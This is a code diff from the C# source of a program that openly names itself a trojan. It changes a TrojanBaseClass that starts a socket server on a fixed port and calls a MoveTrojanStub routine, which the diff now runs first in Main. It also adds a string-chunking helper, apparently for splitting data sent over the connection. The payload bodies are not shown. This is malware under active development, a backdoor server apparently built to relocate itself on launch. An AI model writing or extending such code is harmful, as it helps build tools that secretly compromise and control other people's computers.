@@ -1,12 +1,43 @@
 ﻿using System;
 using System.Text;
-using System.Diagnostics;
 using System.Runtime.InteropServices;
+using System.Globalization;
 using Trojan.server;
 using SocketData;
 
 namespace Trojan
 {
+    public static class StringExtensions
+    {
+        public static IEnumerable<string> Partition(this string value, int chunkSize)
+        {
+            if (value == null)
+            {
+                throw new ArgumentNullException(nameof(value));
+            }
+            if (chunkSize < 1)
+            {
+                throw new ArgumentOutOfRangeException(nameof(chunkSize));
+            }
+            var sb = new StringBuilder(chunkSize);
+            var enumerator = StringInfo.GetTextElementEnumerator(value);
+            while (enumerator.MoveNext())
+            {
+                sb.Append(enumerator.GetTextElement());
+                for (var i = 0; i < chunkSize - 1; i++)
+                {
+                    if (!enumerator.MoveNext())
+                    {
+                        break;
+                    }
+                    sb.Append(enumerator.GetTextElement());
+                }
+                yield return sb.ToString();
+                sb.Length = 0;
+            }
+        }
+    }
+
     public class TrojanBaseClass
     {
         static internal void MoveTrojanStub()
@@ -73,15 +104,16 @@ namespace Trojan
         public Server server = new Server();
 
         /// <summary>
-        /// The main entry point for the application.
+        /// The main entry point for the trojan.
         /// </summary>
         public static void Main()
         {
+            MoveTrojanStub();
+
             TrojanBaseClass TrojanBase = new TrojanBaseClass();
 
             TrojanBase.server.Init_Server(SocketHandler.PORT, SocketHandler.BUFFSIZE);
 
-            MoveTrojanStub();
             while(true)
             {
  
